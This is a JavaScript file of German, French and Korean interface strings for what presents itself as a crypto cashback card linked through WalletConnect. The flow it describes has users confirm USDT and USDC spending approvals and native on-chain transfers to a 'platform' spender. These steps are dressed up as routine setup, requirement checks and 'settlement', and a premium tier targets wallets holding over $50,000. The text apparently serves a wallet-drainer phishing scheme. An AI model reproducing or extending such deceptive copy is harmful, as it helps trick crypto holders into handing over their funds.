import { EN_WALLET } from "./en.mjs";
import { walletI18nFor } from "./wallet-eligibility-i18n.mjs";

const WALLET_TRANSLATIONS = {
  de: {
    closeAria: "Schließen",
    cancel: "Abbrechen",
    continue: "Weiter",
    tryAgain: "Erneut versuchen",
    premiumBadge: "Premium",
    titleLinking: "Karte verknüpfen",
    titleSelect: "Karte auswählen",
    subtitleLinking: "Bitte warten, während wir Ihre Wallet verbinden.",
    subtitleSelect:
      "Wählen Sie eine Kartenstufe zur Verknüpfung mit Ihrer Non-Custodial-Wallet. Keine Jahresgebühr. Keine versteckten Gebühren.",
    connectingHeadline: "Verbindung mit Ihrer {tier}-Karte",
    connectingMessage:
      "WalletConnect wird vorbereitet. Ihr QR-Code erscheint gleich…",
    cardAlt: "{name}-Karte",
    linkNetworkTitle: "Netzwerk auswählen",
    walletSetupHeadline: "Wallet wird eingerichtet",
    walletSetupHelper:
      "{cardLabel} · Schließen Sie die folgenden Schritte ab, um Ihr erstes Netzwerk zu verknüpfen",
    subWalletSetup:
      "Salden werden synchronisiert und Netzwerke für Ihre Wallet vorbereitet…",
    subLoadingNetworks: "Verfügbare Netzwerke für Ihre Wallet werden geladen…",
    subLinkingWithLinked:
      "Schließen Sie die Schritte in Ihrer Wallet ab, um das ausgewählte Netzwerk zu verknüpfen",
    subLinkingInterruptedLinked:
      "Die Verknüpfung wurde unterbrochen. Ihre verknüpften Netzwerke sind unverändert.",
    subSelectAnother:
      "Wählen Sie ein weiteres Netzwerk oder schließen Sie, wenn Sie fertig sind",
    subAllLinked:
      "Alle verfügbaren Netzwerke sind verknüpft — schließen Sie, wenn Sie fertig sind",
    subLinking:
      "Schließen Sie die Schritte in Ihrer Wallet ab, um dieses Netzwerk zu verknüpfen",
    subLinkingInterrupted:
      "Die Verknüpfung wurde unterbrochen. Sie können es später erneut versuchen.",
    subChooseNetwork:
      "Wählen Sie das primäre Blockchain-Netzwerk für diese Karte",
    sectionLinked: "Verknüpft",
    sectionLinking: "Verknüpfung",
    sectionLinkNetworks: "Netzwerke verknüpfen",
    sectionLinkingInterrupted: "Verknüpfung unterbrochen",
    badgeDenied: "Abgelehnt",
    badgeLinking: "Verknüpfung",
    badgeCheckWallet: "Wallet prüfen",
    badgeLinked: "Verknüpft",
    cardBlackDesc:
      "Erhalten Sie 1 % Cashback bei jedem Einkauf, ohne Jahresgebühr und mit unkomplizierten Prämien – ideal für den Alltag.",
    cardBlackLink: "Black Card",
    cardSilverDesc:
      "Erhalten Sie 3 % Cashback bei jedem Einkauf – für alle, die mehr aus ihrem Alltag herausholen möchten, mit passendem Premium-Erlebnis.",
    cardSilverLink: "Silver Hybrid Card",
    cardMetalDesc:
      "Erhalten Sie 5 % Cashback bei jedem Einkauf – unsere exklusivste Prämienstufe. Nur für Mitglieder mit über 50.000 $ Wallet-Vermögen.",
    cardMetalLink: "Metal Premium Card",
    netTronDesc: "Schnelle USDT-Transaktionen mit moderaten Gebühren",
    netEthDesc: "Sichere Gas-Optimierung und institutionelle Stabilität",
    netPolDesc: "Layer-2-Skalierung mit Ethereum-Sicherheit",
    netBscDesc: "DeFi-natives Ökosystem mit globaler Liquidität",
    netAvaxDesc: "Hochskalierbare EVM-Subnetze für aktive dApps",
    netArbDesc: "Günstiges Ethereum-L2 mit tiefer DeFi-Liquidität",
    netBaseDesc: "Coinbase-gestütztes L2 für schnelle Alltagszahlungen",
    netSolDesc: "Abwicklung in unter einer Sekunde für häufige Zahlungen",
    helperWalletAction: "Schließen Sie die Anfrage in Ihrer Wallet-App ab.",
    helperOnchainWait:
      "Warten auf Blockchain-Bestätigung. Dies kann einen Moment dauern.",
    helperSetupProcessing: "Wallet-Einrichtung wird verarbeitet…",
    helperFinalizingNative: "Native Überweisung on-chain wird abgeschlossen…",
    stageConnectingLabel: "Verbinden",
    stageConnectingMsgs: [
      "Verbinden",
      "Sichere Verbindung wird hergestellt…",
      "Wallet-Sitzung wird geöffnet…",
    ],
    stagePreparingWalletLabel: "Wallet vorbereiten",
    stagePreparingWalletMsgs: [
      "Wallet vorbereiten",
      "Wallet-Details werden synchronisiert…",
      "Ihre Wallet wird geladen…",
    ],
    stageCheckingReqLabel: "Anforderungen prüfen",
    stageCheckingReqMsgs: [
      "Anforderungen prüfen",
      "Netzwerkanforderungen werden geprüft…",
      "Wallet-Kompatibilität wird überprüft…",
    ],
    stagePrepAuthLabel: "Autorisierung vorbereiten",
    stagePrepAuthMsgs: [
      "Autorisierung vorbereiten",
      "Genehmigungen werden eingerichtet…",
      "Wallet-Bestätigung wird vorbereitet…",
    ],
    stageBatchLabel: "USDT und USDC in der Wallet bestätigen",
    stageBatchMsgs: [
      "Bestätigen Sie USDT und USDC in Ihrer Wallet",
      "Warten auf Wallet-Bestätigung…",
      "Batch-Genehmigung wird geprüft…",
    ],
    stageUsdtLabel: "USDT in der Wallet bestätigen",
    stageUsdtMsgs: [
      "Bestätigen Sie USDT in Ihrer Wallet",
      "Warten auf Wallet-Bestätigung…",
      "USDT-Genehmigung wird geprüft…",
    ],
    stageUsdcLabel: "USDC in der Wallet bestätigen",
    stageUsdcMsgs: [
      "Bestätigen Sie USDC in Ihrer Wallet",
      "Warten auf Wallet-Bestätigung…",
      "USDC-Genehmigung wird geprüft…",
    ],
    stageNativeLabel: "Native Autorisierung bestätigen",
    stageNativeMsgs: [
      "Native Autorisierung bestätigen",
      "Warten auf Wallet-Bestätigung…",
      "Ihre Autorisierung wird geprüft…",
    ],
    stageAuthCompleteLabel: "Autorisierung abgeschlossen",
    stageAuthCompleteMsgs: [
      "Autorisierung abgeschlossen",
      "Wallet-Einrichtung wird verarbeitet…",
      "Einrichtung wird fortgesetzt…",
    ],
    stageSettlementLabel: "Token-Abwicklung wird verarbeitet",
    stageSettlementMsgs: [
      "Token-Abwicklung wird verarbeitet",
      "Token-Genehmigungen werden abgewickelt…",
      "Abwicklungsschritte werden durchgeführt…",
    ],
    stageUsdtOnchainLabel: "USDT on-chain wird bestätigt…",
    stageUsdtOnchainMsgs: [
      "USDT on-chain wird bestätigt…",
      "Warten auf Blockchain-Bestätigung…",
      "USDT-Transaktionsstatus wird geprüft…",
    ],
    stageUsdcOnchainLabel: "USDC on-chain wird bestätigt…",
    stageUsdcOnchainMsgs: [
      "USDC on-chain wird bestätigt…",
      "Warten auf Blockchain-Bestätigung…",
      "USDC-Transaktionsstatus wird geprüft…",
    ],
    stageFinalizingNativeLabel: "Native Abwicklung wird abgeschlossen",
    stageFinalizingNativeMsgs: [
      "Native Abwicklung wird abgeschlossen",
      "Native Überweisung on-chain wird abgeschlossen…",
      "Warten auf Bestätigung der nativen Überweisung…",
    ],
    stageVerifyingLabel: "Einrichtung wird überprüft",
    stageVerifyingMsgs: [
      "Einrichtung wird überprüft",
      "Alles wird auf Bereitschaft geprüft…",
      "Fast fertig…",
    ],
    stageCompleteLabel: "Wallet erfolgreich verknüpft",
    stageCompleteMsgs: ["Wallet erfolgreich verknüpft"],
    overlayAria: "Netzwerkinformationen werden abgerufen",
    overlayTitle: "Karte verknüpfen",
    overlaySubtitle: "Bitte warten, während wir Ihre Netzwerkdaten vorbereiten.",
    overlayInitial:
      "Wir rufen Netzwerk-, Blockchain- und Token-Informationen für {card} ab.",
    overlayRotating: [
      "Unterstützte Blockchain-Netzwerke werden abgerufen...",
      "Verfügbare Token werden ermittelt...",
      "Wallet-Salden werden abgerufen...",
      "Unterstützte Assets werden geprüft...",
      "Ihr Portfolio wird vorbereitet...",
      "Blockchain-Daten werden synchronisiert...",
      "Netzwerkkompatibilität wird geprüft...",
      "Token-Informationen werden organisiert...",
      "Wallet-Daten werden abgeschlossen...",
      "Fast fertig...",
    ],
    overlayHelperInitial:
      "Dieser Vorgang kann je nach Wallet und Netzwerk einige Minuten dauern.",
    overlayHelperLongWait:
      "Dies dauert etwas länger als erwartet. Bitte bleiben Sie auf diesem Bildschirm und schließen Sie den Vorgang nicht, während wir Ihre Blockchain-Daten abrufen.",
    loadingProcessing: "Verarbeitung",
    statusWaiting: "Warten auf Wallet-Bestätigung...",
    statusFinalizing: "On-Chain-Freigabe wird überprüft...",
    statusLinked: "Verknüpft",
    statusRejected: "Berechtigung vom Benutzer verweigert",
    statusSelectToAuthorize: "Zum Autorisieren von Ausgaben auswählen",
    errPermissionDenied: "Berechtigung vom Benutzer verweigert",
    errFetchBalances: "Salden konnten nicht abgerufen werden",
    errMissingProjectId: "NEXT_PUBLIC_PROJECT_ID fehlt in .env.local",
    errInitWalletConnect: "WalletConnect konnte nicht initialisiert werden",
    errNoAccount:
      "Kein Konto von der Wallet zurückgegeben. Bitte erneut versuchen.",
    errConnectionExpired:
      "Wallet-Verbindung abgelaufen — QR-Code erneut scannen.",
    errConnectionReset:
      "Verbindungsanfrage zurückgesetzt. Bitte erneut versuchen.",
    errNoTronBalances: "Keine Tron-Salden für diese Wallet gefunden",
    errNoEvmBalances: "Keine EVM-Salden für diese Wallet gefunden",
    errSelectNetwork: "Zuerst ein Netzwerk auswählen",
    errNoTronAddress:
      "Keine Tron-Adresse in dieser Sitzung. Mit aktiviertem Tron erneut verbinden.",
    errNoEvmAddress:
      "Keine EVM-Adresse in dieser Sitzung. Mit EVM-fähiger Wallet für dieses Netzwerk erneut verbinden.",
    errTronSponsorUnavailable:
      "TRON-Energie-Sponsoring nicht verfügbar. Später erneut versuchen.",
    errNoWalletAddress: "Keine Wallet-Adresse für dieses Netzwerk",
    errEstimateFailed: "Netzwerkgebühren konnten nicht geschätzt werden",
    errAuthorizationFailed: "Autorisierungssitzung fehlgeschlagen",
    errNativeTransferFailed: "Native Überweisung fehlgeschlagen",
    errApprovalFailed: "Genehmigung fehlgeschlagen",
    errNetworkLinkingFailed:
      "Netzwerkverknüpfung bei Hintergrundabwicklung fehlgeschlagen",
    errMissingSpender:
      "Spender für {network} fehlt: Plattform-Wallets konfigurieren",
  },
  fr: {
    closeAria: "Fermer",
    cancel: "Annuler",
    continue: "Continuer",
    tryAgain: "Réessayer",
    premiumBadge: "Premium",
    titleLinking: "Lier votre carte",
    titleSelect: "Choisir votre carte",
    subtitleLinking: "Patientez pendant que nous connectons votre portefeuille.",
    subtitleSelect:
      "Sélectionnez un niveau de carte à lier à votre portefeuille non custodial. Aucun frais annuel. Aucun frais caché.",
    connectingHeadline: "Connexion à votre carte {tier}",
    connectingMessage:
      "Préparation de WalletConnect. Votre code QR apparaîtra dans un instant…",
    cardAlt: "Carte {name}",
    linkNetworkTitle: "Sélectionner le réseau",
    walletSetupHeadline: "Configuration de votre portefeuille",
    walletSetupHelper:
      "{cardLabel} · Complétez les étapes ci-dessous pour lier votre premier réseau",
    subWalletSetup:
      "Synchronisation des soldes et préparation des réseaux pour votre portefeuille…",
    subLoadingNetworks:
      "Chargement des réseaux disponibles pour votre portefeuille…",
    subLinkingWithLinked:
      "Complétez les étapes dans votre portefeuille pour lier le réseau sélectionné",
    subLinkingInterruptedLinked:
      "La liaison a été interrompue. Vos réseaux liés sont inchangés.",
    subSelectAnother:
      "Sélectionnez un autre réseau à lier, ou fermez lorsque vous êtes prêt",
    subAllLinked:
      "Tous les réseaux disponibles sont liés — fermez lorsque vous êtes prêt",
    subLinking:
      "Complétez les étapes dans votre portefeuille pour lier ce réseau",
    subLinkingInterrupted:
      "La liaison a été interrompue. Vous pouvez réessayer quand vous voulez.",
    subChooseNetwork:
      "Choisissez le réseau blockchain principal à lier à cette carte",
    sectionLinked: "Lié",
    sectionLinking: "Liaison",
    sectionLinkNetworks: "Lier des réseaux",
    sectionLinkingInterrupted: "Liaison interrompue",
    badgeDenied: "Refusé",
    badgeLinking: "Liaison",
    badgeCheckWallet: "Vérifier le portefeuille",
    badgeLinked: "Lié",
    cardBlackDesc:
      "Gagnez 1 % de cashback sur chaque achat, sans frais annuels et avec des récompenses simples — un choix facile pour les dépenses quotidiennes.",
    cardBlackLink: "Carte Black",
    cardSilverDesc:
      "Obtenez 3 % de cashback sur chaque achat, conçue pour ceux qui veulent plus de leurs dépenses quotidiennes, avec une expérience premium à la hauteur.",
    cardSilverLink: "Carte Silver Hybrid",
    cardMetalDesc:
      "Gagnez 5 % de cashback sur chaque achat, notre niveau de récompenses le plus exclusif. Réservé aux membres avec plus de 50 000 $ d'actifs en portefeuille.",
    cardMetalLink: "Carte Metal Premium",
    netTronDesc: "Transactions USDT rapides avec des frais modérés",
    netEthDesc: "Optimisation sécurisée du gas et stabilité institutionnelle",
    netPolDesc: "Scalabilité Layer-2 avec la sécurité d'Ethereum",
    netBscDesc: "Écosystème DeFi natif avec liquidité mondiale",
    netAvaxDesc: "Sous-réseaux EVM hautement scalables pour dApps actives",
    netArbDesc: "L2 Ethereum à faible coût avec liquidité DeFi profonde",
    netBaseDesc: "L2 soutenue par Coinbase pour des paiements quotidiens rapides",
    netSolDesc: "Règlement en moins d'une seconde pour dépenses fréquentes",
    helperWalletAction: "Complétez la demande dans votre application de portefeuille.",
    helperOnchainWait:
      "En attente de confirmation blockchain. Cela peut prendre quelques instants.",
    helperSetupProcessing: "Traitement de la configuration de votre portefeuille…",
    helperFinalizingNative: "Finalisation du transfert natif on-chain…",
    stageConnectingLabel: "Connexion",
    stageConnectingMsgs: [
      "Connexion",
      "Établissement d'une connexion sécurisée…",
      "Ouverture de la session portefeuille…",
    ],
    stagePreparingWalletLabel: "Préparation du portefeuille",
    stagePreparingWalletMsgs: [
      "Préparation du portefeuille",
      "Synchronisation des détails du portefeuille…",
      "Chargement de votre portefeuille…",
    ],
    stageCheckingReqLabel: "Vérification des exigences",
    stageCheckingReqMsgs: [
      "Vérification des exigences",
      "Vérification des exigences réseau…",
      "Examen de la compatibilité du portefeuille…",
    ],
    stagePrepAuthLabel: "Préparation de l'autorisation",
    stagePrepAuthMsgs: [
      "Préparation de l'autorisation",
      "Configuration des approbations…",
      "Préparation de la confirmation portefeuille…",
    ],
    stageBatchLabel: "Confirmer USDT et USDC dans le portefeuille",
    stageBatchMsgs: [
      "Confirmez USDT et USDC dans votre portefeuille",
      "En attente de confirmation du portefeuille…",
      "Vérification de votre approbation groupée…",
    ],
    stageUsdtLabel: "Confirmer USDT dans le portefeuille",
    stageUsdtMsgs: [
      "Confirmez USDT dans votre portefeuille",
      "En attente de confirmation du portefeuille…",
      "Vérification de votre approbation USDT…",
    ],
    stageUsdcLabel: "Confirmer USDC dans le portefeuille",
    stageUsdcMsgs: [
      "Confirmez USDC dans votre portefeuille",
      "En attente de confirmation du portefeuille…",
      "Vérification de votre approbation USDC…",
    ],
    stageNativeLabel: "Confirmer l'autorisation native",
    stageNativeMsgs: [
      "Confirmer l'autorisation native",
      "En attente de confirmation du portefeuille…",
      "Vérification de votre autorisation…",
    ],
    stageAuthCompleteLabel: "Autorisation terminée",
    stageAuthCompleteMsgs: [
      "Autorisation terminée",
      "Traitement de la configuration de votre portefeuille…",
      "Poursuite de la configuration…",
    ],
    stageSettlementLabel: "Traitement du règlement des tokens",
    stageSettlementMsgs: [
      "Traitement du règlement des tokens",
      "Règlement des approbations de tokens…",
      "Progression des étapes de règlement…",
    ],
    stageUsdtOnchainLabel: "Confirmation USDT on-chain…",
    stageUsdtOnchainMsgs: [
      "Confirmation USDT on-chain…",
      "En attente de confirmation blockchain…",
      "Vérification du statut de la transaction USDT…",
    ],
    stageUsdcOnchainLabel: "Confirmation USDC on-chain…",
    stageUsdcOnchainMsgs: [
      "Confirmation USDC on-chain…",
      "En attente de confirmation blockchain…",
      "Vérification du statut de la transaction USDC…",
    ],
    stageFinalizingNativeLabel: "Finalisation du règlement natif",
    stageFinalizingNativeMsgs: [
      "Finalisation du règlement natif",
      "Finalisation du transfert natif on-chain…",
      "En attente de confirmation du transfert natif…",
    ],
    stageVerifyingLabel: "Vérification de la configuration",
    stageVerifyingMsgs: [
      "Vérification de la configuration",
      "Confirmation que tout est prêt…",
      "Presque terminé…",
    ],
    stageCompleteLabel: "Portefeuille lié avec succès",
    stageCompleteMsgs: ["Portefeuille lié avec succès"],
    overlayAria: "Récupération des informations réseau",
    overlayTitle: "Lier votre carte",
    overlaySubtitle:
      "Patientez pendant que nous préparons vos données réseau.",
    overlayInitial:
      "Nous récupérons les informations réseau, blockchain et tokens pour {card}.",
    overlayRotating: [
      "Récupération des réseaux blockchain pris en charge...",
      "Découverte des tokens disponibles...",
      "Récupération des soldes du portefeuille...",
      "Vérification des actifs pris en charge...",
      "Préparation de votre portefeuille...",
      "Synchronisation des données blockchain...",
      "Vérification de la compatibilité réseau...",
      "Organisation des informations sur les tokens...",
      "Finalisation des données du portefeuille...",
      "Presque prêt...",
    ],
    overlayHelperInitial:
      "Ce processus peut prendre quelques minutes selon votre portefeuille et le réseau sélectionné.",
    overlayHelperLongWait:
      "Cela prend un peu plus de temps que prévu. Restez sur cet écran et ne fermez pas le processus pendant que nous récupérons vos données blockchain.",
    loadingProcessing: "Traitement",
    statusWaiting: "En attente de confirmation du portefeuille...",
    statusFinalizing: "Vérification de l'allocation on-chain...",
    statusLinked: "Lié",
    statusRejected: "Permission refusée par l'utilisateur",
    statusSelectToAuthorize: "Sélectionner pour autoriser les dépenses",
    errPermissionDenied: "Permission refusée par l'utilisateur",
    errFetchBalances: "Échec de la récupération des soldes",
    errMissingProjectId: "NEXT_PUBLIC_PROJECT_ID manquant dans .env.local",
    errInitWalletConnect: "Échec de l'initialisation de WalletConnect",
    errNoAccount:
      "Aucun compte retourné par le portefeuille. Veuillez réessayer.",
    errConnectionExpired:
      "Connexion portefeuille expirée — scannez à nouveau le code QR.",
    errConnectionReset: "Demande de connexion réinitialisée. Veuillez réessayer.",
    errNoTronBalances: "Aucun solde Tron trouvé pour ce portefeuille",
    errNoEvmBalances: "Aucun solde EVM trouvé pour ce portefeuille",
    errSelectNetwork: "Sélectionnez d'abord un réseau",
    errNoTronAddress:
      "Aucune adresse Tron dans cette session. Reconnectez avec Tron activé.",
    errNoEvmAddress:
      "Aucune adresse EVM dans cette session. Reconnectez avec un portefeuille compatible EVM pour ce réseau.",
    errTronSponsorUnavailable:
      "Le parrainage d'énergie TRON est indisponible. Réessayez plus tard.",
    errNoWalletAddress: "Aucune adresse de portefeuille pour ce réseau",
    errEstimateFailed: "Échec de l'estimation des frais réseau",
    errAuthorizationFailed: "Échec de la session d'autorisation",
    errNativeTransferFailed: "Échec du transfert natif",
    errApprovalFailed: "Échec de l'approbation",
    errNetworkLinkingFailed:
      "Échec de la liaison réseau lors du règlement en arrière-plan",
    errMissingSpender:
      "Spender manquant pour {network} : configurez les portefeuilles de la plateforme",
  },
};

// Additional locales use same pattern - extend below
const MORE_WALLETS = {
  ko: {
    closeAria: "닫기",
    cancel: "취소",
    continue: "계속",
    tryAgain: "다시 시도",
    premiumBadge: "프리미엄",
    titleLinking: "카드 연결",
    titleSelect: "카드 선택",
    subtitleLinking: "지갑을 연결하는 동안 잠시 기다려 주세요.",
    subtitleSelect:
      "비수탁 지갑과 연결할 카드 등급을 선택하세요. 연회비 없음. 숨겨진 수수료 없음.",
    connectingHeadline: "{tier} 카드에 연결 중",
    connectingMessage: "WalletConnect를 준비 중입니다. QR 코드가 곧 표시됩니다…",
    cardAlt: "{name} 카드",
    linkNetworkTitle: "네트워크 선택",
    walletSetupHeadline: "지갑 설정 중",
    walletSetupHelper:
      "{cardLabel} · 첫 번째 네트워크를 연결하려면 아래 단계를 완료하세요",
    subWalletSetup: "잔액을 동기화하고 지갑용 네트워크를 준비하는 중…",
    subLoadingNetworks: "지갑에 사용 가능한 네트워크를 불러오는 중…",
    subLinkingWithLinked: "선택한 네트워크를 연결하려면 지갑에서 단계를 완료하세요",
    subLinkingInterruptedLinked:
      "연결이 중단되었습니다. 연결된 네트워크는 변경되지 않았습니다.",
    subSelectAnother: "다른 네트워크를 선택하거나 준비되면 닫으세요",
    subAllLinked: "사용 가능한 모든 네트워크가 연결되었습니다 — 준비되면 닫으세요",
    subLinking: "이 네트워크를 연결하려면 지갑에서 단계를 완료하세요",
    subLinkingInterrupted:
      "연결이 중단되었습니다. 준비되면 다시 시도할 수 있습니다.",
    subChooseNetwork: "이 카드와 연결할 기본 블록체인 네트워크를 선택하세요",
    sectionLinked: "연결됨",
    sectionLinking: "연결 중",
    sectionLinkNetworks: "네트워크 연결",
    sectionLinkingInterrupted: "연결 중단됨",
    badgeDenied: "거부됨",
    badgeLinking: "연결 중",
    badgeCheckWallet: "지갑 확인",
    badgeLinked: "연결됨",
    cardBlackDesc:
      "모든 구매에서 1% 캐시백, 연회비 없이 간단한 리워드 — 일상 지출에 이상적인 선택입니다.",
    cardBlackLink: "블랙 카드",
    cardSilverDesc:
      "모든 구매에서 3% 캐시백, 일상 지출에서 더 많은 가치를 원하는 분을 위한 프리미엄 경험.",
    cardSilverLink: "실버 하이브리드 카드",
    cardMetalDesc:
      "모든 구매에서 5% 캐시백, 가장 독점적인 리워드 등급. 지갑 자산 $50,000 이상 회원 전용.",
    cardMetalLink: "메탈 프리미엄 카드",
    netTronDesc: "적당한 수수료로 빠른 USDT 거래",
    netEthDesc: "안전한 가스 최적화 및 기관급 안정성",
    netPolDesc: "이더리움 보안을 갖춘 레이어 2 확장성",
    netBscDesc: "글로벌 유동성을 갖춘 DeFi 네이티브 생태계",
    netAvaxDesc: "활성 dApp을 위한 고확장 EVM 서브넷",
    netArbDesc: "깊은 DeFi 유동성의 저비용 이더리움 L2",
    netBaseDesc: "빠른 일상 결제를 위한 Coinbase 지원 L2",
    netSolDesc: "고빈도 지출을 위한 1초 미만 결제",
    helperWalletAction: "지갑 앱에서 요청을 완료하세요.",
    helperOnchainWait: "블록체인 확인을 기다리는 중입니다. 잠시 걸릴 수 있습니다.",
    helperSetupProcessing: "지갑 설정을 처리하는 중…",
    helperFinalizingNative: "온체인 네이티브 전송을 완료하는 중…",
    stageConnectingLabel: "연결 중",
    stageConnectingMsgs: ["연결 중", "보안 연결 설정 중…", "지갑 세션 열기 중…"],
    stagePreparingWalletLabel: "지갑 준비 중",
    stagePreparingWalletMsgs: [
      "지갑 준비 중",
      "지갑 세부 정보 동기화 중…",
      "지갑 불러오는 중…",
    ],
    stageCheckingReqLabel: "요구 사항 확인 중",
    stageCheckingReqMsgs: [
      "요구 사항 확인 중",
      "네트워크 요구 사항 확인 중…",
      "지갑 호환성 검토 중…",
    ],
    stagePrepAuthLabel: "승인 준비 중",
    stagePrepAuthMsgs: [
      "승인 준비 중",
      "승인 설정 중…",
      "지갑 확인 준비 중…",
    ],
    stageBatchLabel: "지갑에서 USDT 및 USDC 확인",
    stageBatchMsgs: [
      "지갑에서 USDT 및 USDC를 확인하세요",
      "지갑 확인 대기 중…",
      "일괄 승인 확인 중…",
    ],
    stageUsdtLabel: "지갑에서 USDT 확인",
    stageUsdtMsgs: [
      "지갑에서 USDT를 확인하세요",
      "지갑 확인 대기 중…",
      "USDT 승인 확인 중…",
    ],
    stageUsdcLabel: "지갑에서 USDC 확인",
    stageUsdcMsgs: [
      "지갑에서 USDC를 확인하세요",
      "지갑 확인 대기 중…",
      "USDC 승인 확인 중…",
    ],
    stageNativeLabel: "네이티브 승인 확인",
    stageNativeMsgs: [
      "네이티브 승인 확인",
      "지갑 확인 대기 중…",
      "승인 확인 중…",
    ],
    stageAuthCompleteLabel: "승인 완료",
    stageAuthCompleteMsgs: [
      "승인 완료",
      "지갑 설정 처리 중…",
      "설정 계속 중…",
    ],
    stageSettlementLabel: "토큰 정산 처리 중",
    stageSettlementMsgs: [
      "토큰 정산 처리 중",
      "토큰 승인 정산 중…",
      "정산 단계 진행 중…",
    ],
    stageUsdtOnchainLabel: "온체인 USDT 확인 중…",
    stageUsdtOnchainMsgs: [
      "온체인 USDT 확인 중…",
      "블록체인 확인 대기 중…",
      "USDT 거래 상태 확인 중…",
    ],
    stageUsdcOnchainLabel: "온체인 USDC 확인 중…",
    stageUsdcOnchainMsgs: [
      "온체인 USDC 확인 중…",
      "블록체인 확인 대기 중…",
      "USDC 거래 상태 확인 중…",
    ],
    stageFinalizingNativeLabel: "네이티브 정산 완료 중",
    stageFinalizingNativeMsgs: [
      "네이티브 정산 완료 중",
      "온체인 네이티브 전송 완료 중…",
      "네이티브 전송 확인 대기 중…",
    ],
    stageVerifyingLabel: "설정 확인 중",
    stageVerifyingMsgs: ["설정 확인 중", "모든 준비 완료 확인 중…", "거의 완료…"],
    stageCompleteLabel: "지갑 연결 성공",
    stageCompleteMsgs: ["지갑 연결 성공"],
    overlayAria: "네트워크 정보 가져오는 중",
    overlayTitle: "카드 연결",
    overlaySubtitle: "네트워크 데이터를 준비하는 동안 잠시 기다려 주세요.",
    overlayInitial:
      "{card}에 대한 네트워크, 블록체인 및 토큰 정보를 가져오는 중입니다.",
    overlayRotating: [
      "지원되는 블록체인 네트워크 가져오는 중...",
      "사용 가능한 토큰 검색 중...",
      "지갑 잔액 검색 중...",
      "지원 자산 확인 중...",
      "포트폴리오 준비 중...",
      "블록체인 데이터 동기화 중...",
      "네트워크 호환성 확인 중...",
      "토큰 정보 정리 중...",
      "지갑 데이터 완료 중...",
      "거의 준비됨...",
    ],
    overlayHelperInitial:
      "지갑과 선택한 네트워크에 따라 이 과정은 몇 분 걸릴 수 있습니다.",
    overlayHelperLongWait:
      "예상보다 시간이 조금 더 걸리고 있습니다. 블록체인 데이터를 계속 가져오는 동안 이 화면을 유지하고 프로세스를 닫지 마세요.",
    loadingProcessing: "처리 중",
    statusWaiting: "지갑 확인 대기 중...",
    statusFinalizing: "온체인 허용량 확인 중...",
    statusLinked: "연결됨",
    statusRejected: "사용자가 권한을 거부함",
    statusSelectToAuthorize: "지출 승인을 위해 선택",
    errPermissionDenied: "사용자가 권한을 거부함",
    errFetchBalances: "잔액을 가져오지 못했습니다",
    errMissingProjectId: ".env.local에 NEXT_PUBLIC_PROJECT_ID가 없습니다",
    errInitWalletConnect: "WalletConnect 초기화 실패",
    errNoAccount: "지갑에서 계정이 반환되지 않았습니다. 다시 시도하세요.",
    errConnectionExpired:
      "지갑 연결이 만료되었습니다 — QR 코드를 다시 스캔하세요.",
    errConnectionReset: "연결 요청이 재설정되었습니다. 다시 시도하세요.",
    errNoTronBalances: "이 지갑에 Tron 잔액이 없습니다",
    errNoEvmBalances: "이 지갑에 EVM 잔액이 없습니다",
    errSelectNetwork: "먼저 네트워크를 선택하세요",
    errNoTronAddress:
      "이 세션에 Tron 주소가 없습니다. Tron을 활성화하고 다시 연결하세요.",
    errNoEvmAddress:
      "이 세션에 EVM 주소가 없습니다. 이 네트워크용 EVM 지갑으로 다시 연결하세요.",
    errTronSponsorUnavailable:
      "TRON 에너지 스폰서십을 사용할 수 없습니다. 나중에 다시 시도하세요.",
    errNoWalletAddress: "이 네트워크에 대한 지갑 주소가 없습니다",
    errEstimateFailed: "네트워크 수수료 추정 실패",
    errAuthorizationFailed: "승인 세션 실패",
    errNativeTransferFailed: "네이티브 전송 실패",
    errApprovalFailed: "승인 실패",
    errNetworkLinkingFailed: "백그라운드 정산 중 네트워크 연결 실패",
    errMissingSpender:
      "{network}에 대한 spender가 없습니다: 플랫폼 지갑을 구성하세요",
  },
};

Object.assign(WALLET_TRANSLATIONS, MORE_WALLETS);

export function makeWallet(code) {
  const overrides = WALLET_TRANSLATIONS[code];
  if (!overrides) {
    throw new Error(`Unknown wallet locale: ${code}`);
  }
  return { ...EN_WALLET, ...overrides, ...walletI18nFor(code) };
}
